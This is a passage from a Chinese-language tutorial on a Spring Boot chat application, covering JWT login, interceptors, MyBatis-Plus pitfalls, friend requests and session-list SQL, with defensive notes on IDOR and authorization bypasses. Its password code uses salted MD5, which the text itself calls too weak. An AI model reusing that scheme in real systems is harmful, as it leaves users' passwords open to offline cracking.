            return null;
        }
    }
}
```

**关于密钥长度**：`Keys.hmacShaKeyFor` 会根据字节数决定算法 —— Base64 解出来少于 32 字节会直接抛异常。
所以生成密钥用 `openssl rand -base64 48`（48 字节，稳）。

> 🔴 **`jwt.secret` 的默认值写在仓库里 = 等于没有鉴权。**
> `jwt.secret` 只用于验签，服务端不看别的。密钥公开 → **任何人手搓一个 `{"userId":4}` 的 token 就能冒充别人登录**。
> 上线必须换（第 15 章阶段 1 有生成命令）。

### 4.4 密码：MD5 + 每用户随机盐

```java
@Slf4j
public class Md5Util {
    private static final int MD5_LENGTH = 32;
    private static final int STORED_LENGTH = MD5_LENGTH * 2;   // 密文 + 盐 = 64

    /** 加密：生成随机盐，输出 md5(密码 + 盐) + 盐 */
    public static String encrypt(String password) {
        String salt = UUID.randomUUID().toString().replace("-", "");   // 32 位
        String finalPassword = DigestUtils.md5DigestAsHex(
                (password + salt).getBytes(StandardCharsets.UTF_8));
        return finalPassword + salt;
    }

    /** 校验：从库里存的 64 位里切出前 32 位密文和后 32 位盐，再算一遍比对 */
    public static Boolean verify(String inputPassword, String storedPassword) {
        if (!StringUtils.hasText(inputPassword) || !StringUtils.hasText(storedPassword)) {
            log.warn("密码校验失败：输入密码或数据库密码为空");
            return false;
        }
        if (storedPassword.length() != STORED_LENGTH) {
            log.warn("密码校验失败：密文长度不是 {} 位，实际 {} 位", STORED_LENGTH, storedPassword.length());
            return false;
        }
        String finalPassword = storedPassword.substring(0, MD5_LENGTH);
        String salt = storedPassword.substring(MD5_LENGTH);
        String computedPassword = DigestUtils.md5DigestAsHex(
                (inputPassword + salt).getBytes(StandardCharsets.UTF_8));
        return computedPassword.equals(finalPassword);
    }
}
```

**三个设计点**：

1. **"密文 + 盐"拼成一个字段存**，不用单独加 `salt` 列 —— 少一列、少一次查询，代价是必须在代码里约定拼接顺序（所以上面那条"长度必须是 64"的校验很关键）。
2. **每个用户独立随机盐**：同样的密码在库里长得不一样，彩虹表失效；但**挡不住 GPU 离线爆破**（MD5 太快了）。正确做法是 BCrypt/Argon2（见第 17 章）。
3. **`password` 列必须 `varchar(64)`**，少了会被截断 —— 截断之后的表现是"密码怎么都验不过"，而你会去怀疑加密逻辑。

### 4.5 登录拦截器：把 userId 放进 request 域

```java
@Slf4j
@Component
public class LoginInterceptor implements HandlerInterceptor {

    private final JwtUtil jwtUtil;

    public LoginInterceptor(JwtUtil jwtUtil) {
        this.jwtUtil = jwtUtil;
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)
            throws IOException {
        // 1. 取请求头中的 token
        String userToken = request.getHeader(Constant.USER_TOKEN_HEADER);
        if (!StringUtils.hasText(userToken)) {
            log.warn("请求被拦截：未携带 token, uri = {}", request.getRequestURI());
            return reject(response, "未登录，请先登录");
        }

        // 2. 解析 token（parseJwt 内部已捕获异常，失败返回 null）
        Claims claims = jwtUtil.parseJwt(userToken);
        if (claims == null) {
            log.warn("请求被拦截：token 无效或已过期, uri = {}", request.getRequestURI());
            return reject(response, "登录已过期，请重新登录");
        }

        // 3. 校验必要 claim。
        //    ⚠️ 用 toString() 再转，别直接强转 —— JSON 反序列化时数字可能是 Integer 也可能是 Long
        Object idObj = claims.get(Constant.JWT_CLAIM_ID);
        if (idObj == null) {
            log.warn("请求被拦截：token 中缺少 {}", Constant.JWT_CLAIM_ID);
            return reject(response, "登录态异常，请重新登录");
        }
        Integer userId = Integer.valueOf(idObj.toString());

        // 4. 放进 request 域，后续 Controller 从这里取
        request.setAttribute(Constant.CURRENT_USER_ID, userId);
        request.setAttribute(Constant.CURRENT_USER_NAME, claims.get(Constant.JWT_CLAIM_NAME, String.class));

        log.info("登录校验通过，userId:{}, uri:{}, method:{}", userId, request.getRequestURI(), request.getMethod());
        return true;
    }

    /** 统一 401 + JSON 响应体；返回 false 是为了调用处能写成 return reject(...)，一行收敛 */
    private boolean reject(HttpServletResponse response, String message) throws IOException {
        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
        response.setContentType("application/json;charset=utf-8");
        response.getWriter().write("{\"code\":401,\"message\":\"" + message + "\"}");
        return false;
    }
}
```

> 🔴 **最重要的一条约定在这里定下**：
> **当前用户身份只从 `request.getAttribute(Constant.CURRENT_USER_ID)` 取，绝不从请求参数取。**
>
> 一旦写成 `@RequestParam Integer userId`，前端只要改个数字就能看别人的聊天记录、换别人的头像。
> 这个项目里所有 Controller 的取法都是同一行，就是为了让这条约定**看起来不可能写歪**。

### 4.6 WebConfig：拦 `/**` + 显式放行

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        // 1. 观测拦截器：拦全部路径，只打日志、不做鉴权
        registry.addInterceptor(logInterceptor).addPathPatterns("/**");

        // 2. 登录拦截器：默认全拦 + 显式放行。
        //    这样【新增接口默认就是"需要登录"的】，不会因为忘记加路径而漏掉鉴权。
        registry.addInterceptor(loginInterceptor)
                .addPathPatterns("/**")
                .excludePathPatterns(
                        // 登录 / 注册接口本身
                        "/user/login",
                        "/user/register",
                        // 静态页面：页面能否使用交给前端 JS 判断，
                        // 避免浏览器直接跳页面时拿到一大坨 JSON
                        "/login.html", "/register.html", "/client.html",
                        // 静态资源
                        "/css/**", "/js/**", "/image/**", "/favicon.ico",
                        // 🔴 关键：Controller 抛异常后 SpringBoot 会 forward 到 /error，
                        //    不排除的话这次内部转发会被再拦一次，401 会盖掉真正的错误
                        "/error",
                        // 🔴 WebSocket 握手拿不到 User-Token 请求头，鉴权交给握手拦截器
                        "/ws/**",
                        // 🔴 头像读取：<img src="/avatar/4"> 是浏览器原生请求，带不了自定义请求头。
                        //    只放行读取；上传头像走 POST /user/avatar，仍然需要登录
                        "/avatar/**",
                        // 🔴 上传目录的静态资源（聊天图片也是 <img src>）
                        "/upload/**"
                );
    }
}
```

**这个"拦全部 + 放行清单"的写法，比"逐个接口加 `@Interceptor`"安全得多** —— 后者漏一个就是一个未鉴权接口，
而前者的默认值是"需要登录"，漏掉的是"多拦了一次"，症状立刻可见（401），不会静默变成漏洞。

**那四个 `🔴` 放行项，每一个都是被 401 教过之后才加上的**：

| 放行项 | 不放行的症状 | 原因 |
|---|---|---|
| `/error` | 真实错误被 401 盖掉 | 异常转发是一次**新的内部请求**，会再过一遍拦截器 |
| `/ws/**` | WebSocket 一直连不上（握手 401） | 握手走的是 MVC 路径匹配，但浏览器不给自定义头 |
| `/avatar/**` | 头像永远不显示，`<img>` 全 404/401 | `<img src>` 不带 `User-Token` |
| `/upload/**` | 聊天图片不显示 | 同上 |

> **注意"只放行读"**：`/avatar/**` 放行的是 `GET`，换头像的 `POST /user/avatar` 依然要登录鉴权。
> 头像和聊天图片本身不算高敏感信息（真要严格就得做签名 URL，见第 17 章）。

### 4.7 TxAfterCommit：把推送推迟到事务提交之后

```java
@Slf4j
public final class TxAfterCommit {

    public static void run(Runnable action) {
        if (action == null) return;

        // 没有事务、或者事务同步没开 → 立刻执行，别把推送弄丢了
        if (!TransactionSynchronizationManager.isSynchronizationActive()) {
            action.run();
            return;
        }

        TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronization() {
            @Override
            public void afterCommit() {
                try {
                    action.run();
                } catch (Exception e) {
                    // 业务已经提交成功了，推送失败不能反过来把请求变成 500。
                    // 代价只是"这次没实时通知到"，对方下次拉列表就能看到。
                    log.warn("事务提交后的推送失败（业务已成功，不影响数据）：{}", e.getMessage(), e);
                }
            }
        });
    }
}
```

**在 `@Transactional` 方法里直接推送，有 3 个问题**：

1. **幽灵消息**：推送成功、对方界面已经显示出来了，但事务随后回滚 —— 对方看到的消息**库里根本不存在**，而且永远不会消失。**这是最严重的一条。**
2. **拉长事务持有时间**：推送是网络 IO，一直占着数据库连接不放。群里几十个人、有人网络卡，整个会话的其他请求都跟着排队。
3. **推送异常会把业务一起回滚**：但"没实时通知到"和"消息没存下来"严重程度完全不同，不该让前者干掉后者。

**用法**：把推送代码原样包进 lambda，不用关心当前有没有事务。

```java
TxAfterCommit.run(() -> onlineUserManager.sendTo(memberId, push));
```

---

## 第 5 章 · 用户模块：注册 / 登录 / 当前用户

### 5.1 实体

```java
@Data
public class User {
    /**
     * 🔴 主键必须标注 @TableId，MyBatis-Plus 才知道这是自增主键，
     * 否则 insert 之后不会把数据库生成的主键回填到对象里 —— 注册接口会返回 userId:null。
     */
    @TableId(type = IdType.AUTO)
    private Integer userId;

    private String userName;
    private String password;
    /** 头像相对路径；NULL 表示没设置过 */
    private String avatar;
}
```

> **列名一行都没写**：交给 MP 按 `map-underscore-to-camel-case: true` 自动把 `userId` 推导成 `user_id`。
> 只在"名字对不上"的时候才用 `@TableField("xxx")` 显式指定。

### 5.2 入参 / 出参 DTO

```java
@Data
public class UserLoginRequest {
    @NotBlank(message = "用户名不能为空")
    private String username;

    @NotBlank(message = "密码不能为空")
    private String password;
}

@Data
public class UserRegisterRequest {
    @NotBlank(message = "用户名不能为空")
    @Size(max = 20, message = "用户名长度不能超过20位")
    private String username;

    @NotBlank(message = "密码不能为空")
    @Size(min = 6, max = 20, message = "密码长度需在6~20位之间")
    private String password;
}

/** 登录返回：userId + token */
@Data @NoArgsConstructor @AllArgsConstructor
public class UserLoginResponse {
    private Integer userId;
    private String token;
}

/**
 * 当前登录用户信息。
 * ⚠️ 字段名必须叫 username（小写）：前端 client.js 读的是 body.username，
 * 而实体 User 的字段是 userName，Jackson 序列化出来是 "userName"，两者对不上。
 * 单独定义 DTO 而不是直接返回实体：① 字段名能和前端约定对齐 ② 不会把 password 返回给前端
 */
@Data @NoArgsConstructor @AllArgsConstructor
public class UserInfoResponse {
    private Integer userId;
    private String username;
}
```

> **`username` vs `userName` 这个小坑值得单独说**：Jackson 默认按 Java 字段名序列化。
> 实体里叫 `userName` → JSON 就是 `{"userName": ...}`；而前端写的是 `body.username`。
> 这类"一个字母大小写导致前端读到 `undefined`"的问题，看接口返回体一眼就能发现，但**如果只测后端不联调就会漏掉**。
> 解决方式就是**单独定义返回体 DTO，字段名按前端契约来**。

### 5.3 Service：登录

```java
@Override
public UserLoginResponse login(UserLoginRequest userLoginRequest) {
    User user = getUserByname(userLoginRequest.getUsername());

    // 用户不存在与密码错误返回同一提示，避免被用于【枚举用户名】
    if (user == null || !Md5Util.verify(userLoginRequest.getPassword(), user.getPassword())) {
        throw new UserException("用户名或密码错误");
    }

    Map<String, Object> map = new HashMap<>();
    map.put(Constant.JWT_CLAIM_ID, user.getUserId());
    map.put(Constant.JWT_CLAIM_NAME, user.getUserName());
    String token = jwtUtil.genJwt(map);

    log.info("登录成功: userId:{}", user.getUserId());
    return new UserLoginResponse(user.getUserId(), token);
}
```

**"用户不存在"和"密码错误"必须回同一句话**。如果分开提示（"该用户不存在" / "密码错误"），
攻击者就能用这个接口**批量探测哪些用户名存在**，再针对性地爆破。

### 5.4 Service：注册

```java
@Override
public UserRegisterResponse register(UserRegisterRequest userRegisterRequest) {
    String username = userRegisterRequest.getUsername();

    // 先查一次给出友好提示；并发下的漏网之鱼由数据库唯一索引兜底
    if (getUserByname(username) != null) {
        throw new UserException("用户名已存在");
    }

    User user = new User();
    user.setUserName(username);
    user.setPassword(Md5Util.encrypt(userRegisterRequest.getPassword()));   // 加盐加密

    try {
        userMapper.insert(user);
    } catch (DuplicateKeyException e) {
        // 两个请求同时注册同一个用户名时，唯一索引会拦下后到的那个
        log.warn("注册失败：用户名已存在，username = {}", username);
        throw new UserException("用户名已存在");
    }

    // 🔴 insert 后 MP 会把自增主键回填到 user.getUserId()（前提是标了 @TableId(AUTO)）
    log.info("注册成功: userId:{}, username:{}", user.getUserId(), username);
    return new UserRegisterResponse(user.getUserId(), username);
}
```

**"先查后插"要不要保留？** 要。因为**它和唯一索引解决的不是同一件事**：

- 先查 → 给出友好提示，覆盖 99.9% 的常规情况
- 唯一索引 + `catch DuplicateKeyException` → 覆盖并发场景（两个请求同时通过"先查"）

只留唯一索引的话，正常用户会看到一句"服务器内部错误"（`DuplicateKeyException` 是 500 级别的异常）；
只留先查的话，并发下会真的插进去两条同名记录。

### 5.5 Controller

```java
@Slf4j
@RestController
@RequestMapping("/user")
public class UserController {

    private final UserService userService;

    public UserController(UserService userService) {
        this.userService = userService;
    }

    @PostMapping("/login")
    public UserLoginResponse login(@Validated @RequestBody UserLoginRequest req) {
        log.info("用户登录：username = {}", req.getUsername());
        return userService.login(req);
    }

    @PostMapping("/register")
    public UserRegisterResponse register(@Validated @RequestBody UserRegisterRequest req) {
        log.info("用户注册：username = {}", req.getUsername());
        return userService.register(req);
    }

    /** 不需要任何入参：拦截器已经校验过 token，并把 userId 放进了 request 域 */
    @GetMapping("/userInfo")
    public UserInfoResponse getUserInfo(HttpServletRequest request) {
        Integer userId = (Integer) request.getAttribute(Constant.CURRENT_USER_ID);
        log.info("获取当前用户信息：userId = {}", userId);
        return userService.getUserInfo(userId);
    }

    /** 换头像：user id 同样只从 request 域取 —— 不能让前端指定"给谁换头像" */
    @PostMapping("/avatar")
    public Map<String, String> updateAvatar(HttpServletRequest request,
                                            @RequestParam("file") MultipartFile file) {
        Integer userId = (Integer) request.getAttribute(Constant.CURRENT_USER_ID);
        return Map.of("avatar", userService.updateAvatar(userId, file));
    }
}
```

**注意 `@RequestMapping("/user")` 是类级前缀，而好友/会话/消息接口全部平铺无前缀** —— 这不是疏忽，
是因为**前端契约（`client.js`）先定下来了**，后端按它反推。真实项目里这种"风格不统一"很常见，
**关键是别自作主张去"统一"它，那会把前端全部打挂。**

---

## 第 6 章 · MyBatis-Plus 使用规范与 6 个必踩的坑

这一章可以当"检查清单"用 —— 项目里 90% 的诡异 bug 都出在这 6 条上。

### 6.1 规范速查

| 规矩 | 说明 |
|---|---|
| 实体主键标 `@TableId(type = IdType.AUTO)` | 否则 insert 不回填自增主键 |
| 列名全蛇形，Java 字段驼峰 | 靠 `map-underscore-to-camel-case: true` 自动映射 |
| 每张表一个自己的 Mapper | 见坑 3 |
| 表名和实体名不一致时用 `@TableName` | 例如 `Message` 表就叫 `message` |
| 自定义 SQL 一律 `@Select` / `@Insert` / `@Update` 注解 | 不用 XML（本项目的明确选择） |
| 多参数必加 `@Param` | 否则 MyBatis 按 `arg0/arg1` 或 `param1/param2` 解析，容易对不上 |
| 模糊查询用 `concat('%', #{x}, '%')` | **禁用 `${}`**，那是字符串拼接 = SQL 注入 |

### 6.2 🔴 坑 1：`@TableId` 不标 = insert 后主键是 null

**症状**：注册接口返回 `{"userId": null}`，但数据库里确实插进去了。
**原因**：MP 不知道哪个字段是自增主键，就不会执行"回填主键"这一步。
**唯一线索**：启动日志里一行 `Not found @TableId annotation`（`WARN` 级别，很容易被刷过去）。

**排查建议**：启动时养成扫一眼日志第一屏的习惯，这类 WARN 比运行期报错好找得多。

### 6.3 🔴 坑 2：列名写成驼峰，报 `Unknown column`

`tableUnderline` 默认 `true`：MP 会把字段名 `sessionId` 转成 `session_id` 再拼 SQL。
库里列名如果是 `sessionId`，SQL 就变成 `select ... where session_id = ?` → `Unknown column 'session_id'`。

**统一蛇形**是最省心的做法；实在要保留驼峰列名，就用 `@TableField("sessionId")` 显式标注。

### 6.4 🔴 坑 3：一个 Mapper 不能操作别的表（编译期就挂）

```java
// FriendMapper 继承的是 BaseMapper<FriendRelation>
public interface FriendMapper extends BaseMapper<FriendRelation> { ... }
```

继承之后，`delete(...)` / `selectCount(...)` 只接受 `Wrapper<FriendRelation>`。
**想用它去删 `add_friend_request` 表，连编译都过不去** —— 这是好事，帮你避免了跨表误操作。

所以：`add_friend_request` 有自己的 `AddFriendRequestMapper`，`message_session_user` 有自己的 `MessageSessionUserMapper`。

> 顺带一个真实教训：退群时"删成员"必须用 `MessageSessionUserMapper`。
> 我一开始顺手拿了 `FriendMapper`，编译报错时才发现自己写错了表。

### 6.5 🔴 坑 4：MP 没有 `insert ignore`，主键冲突会炸事务

MP 的 `insert` 遇到主键冲突会抛 `DuplicateKeyException`。而好友关系、好友申请这类表，
"重复插入应当静默忽略"才是期望语义。**手写注解 SQL**：

```java
@Insert("insert ignore into friend (user_id, friend_id) values (#{userId}, #{friendId})")
int insertIgnoreRelation(@Param("userId") Integer userId, @Param("friendId") Integer friendId);

@Insert("insert ignore into add_friend_request (from_user_id, to_user_id, reason) " +
        "values (#{fromUserId}, #{toUserId}, #{reason})")
int insertIgnoreRequest(@Param("fromUserId") Integer fromUserId,
                        @Param("toUserId") Integer toUserId,
                        @Param("reason") String reason);
```

### 6.6 🔴 坑 5：`@JsonInclude(NON_NULL)` 不能挂在表实体上

**症状**：`friendList` 接口返回的 JSON 里，`friendName` 字段凭空消失，前端显示空白。
**原因**：`friendName` 是 join 出来的字段，表里没这一列；挂了 `NON_NULL` 之后，"null 字段不输出"把**需要输出的字段也一起省掉了**。

**正确的架构**：

```
表实体（pojo.dataobject）   ← 与数据库列一一对应，只在 Mapper/Service 内部流转
接口返回体（pojo.response） ← 与前端契约一一对应，Controller 只返回这个
```

本项目里 `Friend` / `FriendRequestResponse` / `MessageResponse` / `SessionRow` / `SessionListResponse`
都是"返回体"，**只有真正需要 `NON_NULL` 的地方（WebSocket 推送信封）才加这个注解**。

### 6.7 🔴 坑 6：按时间排序取"最新一条"，必须加主键兜底

```sql
-- ❌ 只按时间排：同一秒内的多条消息顺序是不确定的
order by post_time desc limit 1

-- ✅ 加自增主键兜底
order by post_time desc, message_id desc limit 1
```

**为什么**：`post_time` 是 `datetime`（没有小数秒）。同一秒内发的多条消息，时间戳**完全相同**，
"谁在最前"由存储引擎的返回顺序决定。实测中，同一条 SQL 直接查库和放在关联子查询里，
**给出了不同的行** —— 表现为"会话列表显示的最后一条消息，和点进去看到的最后一条不是同一条"。

这个 bug 极难复现（要同一秒发两条），但一旦出现就非常费解。

---

## 第 7 章 · 好友模块：申请、接受、拒绝

### 7.1 Mapper：4 条 SQL 说清好友模块

```java
@Mapper
public interface FriendMapper extends BaseMapper<FriendRelation> {

    /** 好友列表：连着 user 表把名字查出来 */
    @Select("select u.user_id as friendId, u.user_name as friendName " +
            "from friend f join user u on f.friend_id = u.user_id " +
            "where f.user_id = #{userId}")
    List<Friend> selectFriendList(@Param("userId") Integer userId);

    /** 模糊搜索可添加的人：排除自己、排除已是好友的 */
    @Select("select user_id as friendId, user_name as friendName from user " +
            "where user_id != #{selfUserId} " +
            "and user_name like concat('%', #{name}, '%') " +
            "and user_id not in (select friend_id from friend where user_id = #{selfUserId})")
    List<Friend> findFriend(@Param("selfUserId") Integer selfUserId, @Param("name") String name);

    /** 别人发给我的好友申请（连同申请理由） */
    @Select("select r.from_user_id as fromUserId, u.user_name as fromUserName, r.reason " +
            "from add_friend_request r join user u on r.from_user_id = u.user_id " +
            "where r.to_user_id = #{userId}")
    List<FriendRequestResponse> getFriendRequest(@Param("userId") Integer userId);

    /** 建立好友关系，重复时静默忽略 */
    @Insert("insert ignore into friend (user_id, friend_id) values (#{userId}, #{friendId})")
    int insertIgnoreRelation(@Param("userId") Integer userId, @Param("friendId") Integer friendId);
}
```

> `not in (select ...)` 在数据量大时确实有性能问题（可以改 `left join ... is null`），
> 但在这个规模下可读性更重要。**面试时如果被问到，能说出替代写法就是加分项。**

### 7.2 发起好友申请

```java
@Override
public void addFriend(Integer fromUserId, Integer toFriendId, String reason) {
    if (fromUserId.equals(toFriendId)) {
        throw new UserException("不能添加自己为好友");
    }
    User target = userMapper.selectById(toFriendId);
    if (target == null) {
        throw new UserException("用户不存在");
    }

    // 已经是好友就不必再发申请
    LambdaQueryWrapper<FriendRelation> wrapper = new LambdaQueryWrapper<>();
    wrapper.eq(FriendRelation::getUserId, fromUserId)
           .eq(FriendRelation::getFriendId, toFriendId);
    if (friendMapper.selectCount(wrapper) > 0) {
        throw new UserException("你们已经是好友了");
    }

    // 重复发申请时静默忽略（insert ignore）
    addFriendRequestMapper.insertIgnoreRequest(fromUserId, toFriendId, reason);

    // 实时推给对方：对方页面右上角"新的朋友"立刻出现一条，不用手动刷新
    User from = userMapper.selectById(fromUserId);
    boolean pushed = onlineUserManager.sendTo(toFriendId, WsMessageResponse.ofAddFriendRequest(
            fromUserId, from == null ? "未知用户" : from.getUserName(), reason));
    if (!pushed) {
        // 对方不在线不是错误：申请已经落库，他下次上线拉 /getFriendRequest 就能看到
        log.info("接收方 userId = {} 当前不在线，好友请求等其上线后通过 /getFriendRequest 拉取", toFriendId);
    }
}
```

**这里体现了推送的通用原则**：**推送是"锦上添花"，不是数据的唯一去处。**
所有需要实时通知的场景，都要保证"对方不在线时数据也已经落库，他上线后能拉到"。
否则离线用户就会永久丢掉这条通知。

> 注意这个方法是**没有 `@Transactional` 的** —— 只有一条 insert，不需要事务。
> 而下面 `acceptFriend` 有 4 次写操作，就必须要了。

### 7.3 接受好友申请（🔴 一个真实的安全漏洞）

```java
@Override
@Transactional(rollbackFor = Exception.class)
public void acceptFriend(Integer selfUserId, Integer fromUserId) {
    if (fromUserId == null) {
        throw new UserException("参数异常");
    }

    // 🔴 关键安全校验：必须确认"对方确实给我发过申请"。
    //    不校验的后果：GET /acceptFriend?friendId=<任意用户ID> 就能单方面建立双向好友关系，
    //    完全绕过"发申请 → 对方同意"的流程。
    //    而好友关系是后面所有功能的门票（建会话、发消息、拉进群都要求是好友），
    //    等于把整条权限链的入口敞开了。
    LambdaQueryWrapper<AddFriendRequest> requestWrapper = new LambdaQueryWrapper<>();
    requestWrapper.eq(AddFriendRequest::getFromUserId, fromUserId)
                  .eq(AddFriendRequest::getToUserId, selfUserId);
    if (addFriendRequestMapper.selectCount(requestWrapper) == 0) {
        log.warn("处理好友申请失败：不存在 from = {} 到 to = {} 的申请", fromUserId, selfUserId);
        throw new UserException("对方没有向你发送好友申请，或该申请已被处理");
    }

    // 双向插入，用 insert ignore 防重复接受时的主键冲突
    friendMapper.insertIgnoreRelation(selfUserId, fromUserId);
    friendMapper.insertIgnoreRelation(fromUserId, selfUserId);
    // 删掉这条申请
    addFriendRequestMapper.delete(requestWrapper);

    // 推给申请人：对方能立刻看到"XX 已通过你的好友申请"，并自动刷新好友列表。
    // 推迟到事务提交后推 —— 事务若回滚，"已通过"的消息不该发出去。
    User self = userMapper.selectById(selfUserId);
    WsMessageResponse push = WsMessageResponse.ofAcceptFriend(self == null ? "未知用户" : self.getUserName());
    TxAfterCommit.run(() -> onlineUserManager.sendTo(fromUserId, push));
}
```

**这个漏洞是我做完代码评审才发现的，值得完整讲一遍**：

- 原来的写法：直接往 `friend` 表插两条记录 → **任何人只要知道对方 id，就能单方面成为他的好友**；
- 危害不是"多一个好友"这么简单：好友关系是**建会话、发消息、拉进群**的前置条件，
  所以绕过它就等于绕过了整条权限链；
- 修复只有 6 行（查一下申请是否存在），但**必须意识到"权限校验要看数据，不能看参数"**。

**同一类问题的另外两个例子**（都在这个项目里修过）：

| 位置 | 问题 | 修法 |
|---|---|---|
| `createSession` | 不校验好友关系 → 可以和任意用户建会话，再通过 `sendMessage` 发骚扰消息 | 加 `isFriend` 校验 |
| `createGroup` / `addGroupMember` | 不校验好友关系 → 前端随便传几个 userId 就能把陌生人拉进群，让他们看到全部聊天记录 | 加 `isFriend` 校验 |

**但注意一个反例**：

> 🔴 **`isFriend` 这个校验绝对不能加到 `sendMessage` 上。**
> 因为**群成员不一定是好友** —— 我把 A 拉进群，B 也在这个群里，A 和 B 互不认识但都在同一个群里聊天。
> 给 `sendMessage` 加好友校验，群聊功能当场就废了。
>
> 消息发送处该校验的是**"你是不是这条会话的成员"**（`isMember`），不是"你俩是不是好友"。
> 这是"同一类安全问题，在不同位置要用不同的判据"的典型例子。

### 7.4 拒绝申请

```java
@Override
public void rejectFriend(Integer selfUserId, Integer fromUserId) {
    LambdaQueryWrapper<AddFriendRequest> wrapper = new LambdaQueryWrapper<>();
    wrapper.eq(AddFriendRequest::getFromUserId, fromUserId)
           .eq(AddFriendRequest::getToUserId, selfUserId);
    addFriendRequestMapper.delete(wrapper);
}
```

**设计选择**：拒绝 = **静默删掉申请**，不通知申请人"你被拒绝了"。
理由是产品体验（现实中没人希望你告诉他"我被拒绝了"），代价是申请人可以反复发 ——
真要限制得加频率控制（第 17 章的"缺失项"）。

---

## 第 8 章 · 会话模块：会话列表与未读游标

**这一章有两个"看起来能跑、实际上是错的"实现，我都先写错了才改对。** 值得慢慢看。

### 8.1 会话列表的 SQL：一条查询给出所有 UI 需要的东西

```java
@Select("select ms.session_id as sessionId, " +
        "       ms.type      as sessionType, " +
        "       ms.name      as sessionName, " +
        "       u.user_id    as friendId, " +
        "       u.user_name  as friendName, " +
        // 群成员总数（含自己）
        "       (select count(*) from message_session_user m3 " +
        "         where m3.session_id = ms.session_id) as memberCount, " +
        // 最后一条消息的原文
        "       (select m.content from message m " +
        "         where m.session_id = ms.session_id " +
        "         order by m.post_time desc, m.message_id desc limit 1) as lastMessage, " +
        // 最后一条消息是否已撤回 —— 用来把列表里那行换成"撤回了一条消息"
        "       (select m.revoked from message m " +
        "         where m.session_id = ms.session_id " +
        "         order by m.post_time desc, m.message_id desc limit 1) as lastRevoked, " +
        // 最后一条消息的类型（图片要显示成 [图片]）
        "       (select m.type from message m " +
        "         where m.session_id = ms.session_id " +
        "         order by m.post_time desc, m.message_id desc limit 1) as lastType, " +
        // 最后一条消息是谁发的（群聊里显示成"张三: 内容"）
        "       (select u2.user_name from message m " +
        "          join user u2 on u2.user_id = m.from_id " +
        "         where m.session_id = ms.session_id " +
        "         order by m.post_time desc, m.message_id desc limit 1) as lastMessageFrom, " +
        // 我的未读数：不是自己发的、且 message_id 大于我的已读游标
        "       (select count(*) from message m2 " +
        "         where m2.session_id = ms.session_id " +
        "           and m2.from_id <> #{userId} " +
        "           and m2.message_id > me.last_read_message_id) as unreadCount " +
        "from message_session ms " +
        // me：我自己那一行，用来拿 last_read_message_id。
        // 它同时 guarantees「我必须是这个会话的成员」，所以不用再写 where session_id in (子查询)
        "join message_session_user me on me.session_id = ms.session_id and me.user_id = #{userId} " +
        // other：对方那一行，用来拿对方昵称。
        // 🔴 必须是 left join：群里其他人都退光时（只剩我），other 那行不存在，
        //    用 inner join 的话这个群会整行查不出来，等于从会话列表里凭空消失
        "left join message_session_user other on other.session_id = ms.session_id and other.user_id <> #{userId} " +
        "left join user u on u.user_id = other.user_id " +
        "order by ms.last_time desc")
List<SessionRow> selectSessionList(@Param("userId") Integer userId);
```

**这段 SQL 里有三个非显然的设计**：

**① 为什么 `join message_session_user me` 就够了，不用 `where session_id in (...)`？**

`me` 这个 join 的条件里带了 `me.user_id = #{userId}` —— **它本身就保证了"我必须是这个会话的成员"**。
原来那种"先子查询出我的所有 sessionId，再 where in"的写法，多一次查询、还容易写漏。

**② 为什么 `other` 必须是 `left join`？**

群聊会查出"成员数 − 1"行（join 了"除我之外的**每一个**成员"）。
当**群里其他人都退光了、只剩我**的时候，`other` 一行都没有 ——
如果用 `inner join`，这个群会**整行从结果里消失**，用户会发现"我的群不见了"。

**③ 为什么 `lastRevoked` 要单独查一列，而不是把 `lastMessage` 直接查成 null？**

因为**null 分不清是"没有消息"还是"消息被撤回了"**。这两种情况在界面上要显示成不同的东西：

```java
private static String summarize(SessionRow row) {
    if (row.getLastRevoked() != null && row.getLastRevoked() == 1) {
        return "撤回了一条消息";                 // 优先级最高
    }
    if (row.getLastType() != null && row.getLastType() == Constant.MSG_TYPE_IMAGE) {
        return "[图片]";
    }
    return row.getLastMessage();
}
```

### 8.2 Service：为什么必须用 `LinkedHashMap`

```java
@Override
public List<SessionListResponse> getSessionList(Integer userId) {
    List<SessionRow> rows = sessionMapper.selectSessionList(userId);

    // 🔴 必须用 LinkedHashMap：SQL 已经按 last_time 倒序排好了，
    //    HashMap 会打乱顺序，会话列表就不按"最近聊的"排了。
    //    顺带它也承担了"群聊多行合并成一行"的职责。
    Map<Integer, SessionListResponse> grouped = new LinkedHashMap<>();

    for (SessionRow row : rows) {
        SessionListResponse item = grouped.computeIfAbsent(row.getSessionId(), id -> {
            SessionListResponse r = new SessionListResponse();
            r.setSessionId(id);
            r.setSessionType(row.getSessionType());
            r.setSessionName(row.getSessionName());
            r.setMemberCount(row.getMemberCount());
            r.setLastMessageFrom(row.getLastMessageFrom());
            r.setUnreadCount(row.getUnreadCount());
            r.setLastMessage(summarize(row));
            r.setFriends(new ArrayList<>());
            return r;
        });

        // 排掉自己，剩下的都是"对方"：单聊 1 个人，群聊 N 个人。
        // friendId 为 null 说明这个群只剩我一个人了（SQL 那边是 left join），
        // 不能往 friends 里塞一个 id 为 null 的空对象，前端会渲染出一个空白项
        if (row.getFriendId() != null) {
            item.getFriends().add(new Friend(row.getFriendId(), row.getFriendName()));
        }
    }

    return new ArrayList<>(grouped.values());
}
```

**"群聊一个会话查出多行"这件事，是理解整个会话模块的钥匙**：

```
sessionId=3（群"Java 学习小组"，成员：我、A、B）
查出来是 2 行：
  (3, ... , friendId=A, friendName=A的名字)
  (3, ... , friendId=B, friendName=B的名字)
                ↑ unreadCount / lastMessage 这些"会话级"字段每行都一样

→ Java 侧按 sessionId 聚合：
  第一行：建对象、填会话级字段
  第二行：只往 friends 里追加一个成员
```

**用 `HashMap` 会怎样**：数据一条不少，但**顺序乱掉** —— 会话列表不再按"最近聊天"排，
而是按 hash 顺序排。这种 bug 看起来"能用"，但用起来极其别扭。**`LinkedHashMap` 同时解决"合并"和"保序"两个问题。**

### 8.3 创建单聊会话

```java
@Override
@Transactional(rollbackFor = Exception.class)
public SessionCreateResponse createSession(Integer selfUserId, Integer toUserId) {
    // 1. 参数校验
    if (toUserId == null) {
        throw new UserException("参数异常");
    }
    if (selfUserId.equals(toUserId)) {
        throw new UserException("不能和自己聊天");
    }

    // 2. 对方必须存在
    User target = userMapper.selectById(toUserId);
    if (target == null) {
